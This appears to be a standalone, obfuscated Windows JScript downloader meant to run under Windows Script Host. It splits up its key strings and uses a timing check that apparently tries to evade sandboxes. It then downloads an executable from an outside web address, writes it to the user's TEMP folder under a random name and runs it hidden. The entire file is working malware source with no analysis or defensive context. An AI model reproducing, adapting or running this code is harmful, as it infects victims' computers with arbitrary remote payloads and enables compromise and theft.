var L = false;
var PS = "Create"+"Object";
var A1 = function O0() {return WScript[PS]("WScript"+".Shell");}(), SH = 11;
var HC = "MSXML2"+".XMLHTTP";
var J0 = 2;
var K = J0 - 2;
function LC(QT){A1["Run"](QT, K, K);};
function V(){return HC + "";};
function Y(OR, AA){K = K * 1; return OR - AA;};
function N(){return PS;};
/*@cc_on
  @if (@_win32 || @_win64)
    L = true;
  @end
@*/
if (L)
{
var A = "";
function CQ(){return 22;};
var AG = 0; var S = 0;
function FN()
{
var N0 = new this["Date"]();
var UG = N0["getUTCMilliseconds"]();
WScript["Sleep"](CQ());
var N0 = new this["Date"]();
var B = N0["getUTCMilliseconds"]();
WScript["Sleep"](CQ());
var N0 = new this["Date"]();
var UA = N0["getUTCMilliseconds"]();
var AG = "A0";
AG = Y(B, UG);
var S = "DY";
S = Y(UA, B);
A = "open";
return Y(AG, S);
}
var FC = false;
var UT = false;
for (var Z = K; Z < CQ() * 1; Z++){if (FN() != K){
FC = true; 
S = "31" + 11 * AG + S; 
UT = true; 
break;
}}
function O() {return ((FC == true) && (FC == UT)) ? 1 : K;};
if (FC && O() && UT){
function PT() {return A1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "OmCtUNHNg.ex" + "e";};
 VR = V();
 A2 = WScript[PS](VR);
 var J = 1;
do { 
	for (;J;){
	try {
		if (J == 1)
		{
			A2[A]("GET", "http://xn--po-wqa.pl/a8zkde", false);
			A2["send"]();
			F = "Sleep";
			J = 2;
		}
		WScript[F](CQ() + 120); 
		if (A2["readystate"] < 2 * 2) continue;
		J = K;
		function X(U) {var D = (1, 2, 3, 4, 5, U); return D;};
		FU = WScript[N()]("ADODB.Stream");
		VR = FU;
		VR[A]();
		VR["type"] = X(1);
		VR["write"](A2["ResponseBody"]);
		FU["position"] = X(K);
		VR["Save" + "ToFile"](PT(), 2);
		FU["cl"+"ose"]();
		I = PT();
		LC(I);
	} catch(C){};};
}while (J);
}
}

